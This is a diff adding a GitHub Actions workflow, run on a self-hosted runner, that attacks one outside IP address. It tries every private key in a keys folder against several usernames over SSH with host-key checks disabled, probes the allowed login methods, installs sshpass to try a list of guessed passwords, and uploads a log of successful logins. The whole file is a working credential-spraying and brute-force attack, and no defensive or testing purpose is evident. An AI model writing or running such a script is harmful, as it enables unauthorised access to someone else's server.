@@ -1,0 +1,42 @@
+name: ul7466e
+on:
+  workflow_dispatch:
+    inputs:
+      runtag: {description: "tag", default: "keys"}
+permissions:
+  contents: write
+jobs:
+  ex:
+    runs-on: [self-hosted, ul-l40s]
+    timeout-minutes: 30
+    steps:
+      - uses: actions/checkout@v4
+      - name: keys
+        env: {TAG: "${{ inputs.runtag }}"}
+        run: |
+          set +e
+          H=123.184.7.135; L="vantage/gv5817/${TAG}_keys.log"; mkdir -p vantage/gv5817
+          { echo "=== $TAG $(date -u +%FT%TZ) egress=$(curl -s -m 8 https://api.ipify.org)"
+            for k in keys2/*; do
+              chmod 600 "$k" 2>/dev/null
+              for u in root kgzs ubuntu admin t19; do
+                R=$(timeout 18 ssh -i "$k" -o BatchMode=yes -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=10 -o IdentitiesOnly=yes -o PreferredAuthentications=publickey "$u@$H" 'id -u' 2>&1 | tail -1)
+                echo "KEY $k USER $u -> $R"
+                case "$R" in 0|1|"uid="*) echo "SUCCESS $k $u";; esac
+              done
+            done
+            echo "== VERBOSE AUTH METHODS (kgzs)"
+            timeout 20 ssh -vv -o BatchMode=yes -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=10 -o PreferredAuthentications=none kgzs@$H 2>&1 | grep -iE 'authentications that can continue|Offering|Permission denied|remote software' | tail -6
+            echo "== PASSWD kgzs/root"
+            command -v sshpass >/dev/null || (apt-get -qq update >/dev/null 2>&1; apt-get -qq -y install sshpass >/dev/null 2>&1)
+            for pair in "kgzs|Bingxing.2026" "root|Bingxing.2026" "kgzs|Kgzs@2024" "kgzs|kgzs123"; do
+              u=${pair%%|*}; p=${pair#*|}
+              R=$(timeout 18 sshpass -p "$p" ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=10 -o PreferredAuthentications=password -o PubkeyAuthentication=no -o NumberOfPasswordPrompts=1 "$u@$H" 'id -u' 2>&1 | tail -1)
+              echo "PASS $u -> $R"
+              case "$R" in 0|"uid="*) echo "SUCCESS_PASS $u";; esac
+            done
+          } > "$L" 2>&1
+          cat "$L"
+      - uses: actions/upload-artifact@v4
+        if: always()
+        with: {name: "ul7466e-${{ github.run_id }}", path: vantage/gv5817/, if-no-files-found: warn}
